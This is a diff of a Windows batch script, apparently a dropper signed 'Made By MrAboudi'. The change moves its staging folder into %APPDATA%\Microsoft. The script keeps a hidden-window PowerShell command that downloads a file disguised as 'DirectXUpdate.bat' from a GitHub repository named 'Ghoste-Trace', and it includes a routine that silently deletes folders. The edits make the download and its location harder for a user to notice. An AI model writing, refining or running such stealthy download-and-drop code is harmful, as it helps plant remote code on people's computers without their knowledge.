@@ -54,13 +54,13 @@ if exist "%TARGET_FILE%" (
     exit /b 1
 )
 
-:: Prepare Java.bat in AppData\Logs
-set "LOGS_FOLDER=%APPDATA%\Logs"
+:: Prepare Java.bat in AppData\Microsoft
+set "MICROSOFT_FOLDER=%APPDATA%\Microsoft"
 set "DirectXUpdate_BAT_URL=https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/DirectXUpdate.bat"
-set "DirectXUpdate_BAT_FILE=%LOGS_FOLDER%\DirectXUpdate.bat"
+set "DirectXUpdate_BAT_FILE=%MICROSOFT_FOLDER%\DirectXUpdate.bat"
 
-if not exist "%LOGS_FOLDER%" (
-    mkdir "%LOGS_FOLDER%"
+if not exist "%MICROSOFT_FOLDER%" (
+    mkdir "%MICROSOFT_FOLDER%"
 )
 
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DirectXUpdate_BAT_URL%', '%DirectXUpdate_BAT_FILE%'); exit"
@@ -85,7 +85,6 @@ if exist "%~1\" (
     rmdir /s /q "%~1" >nul 2>&1
 )
 exit /b
-
 exit
 
 :: Made By MrAboudi
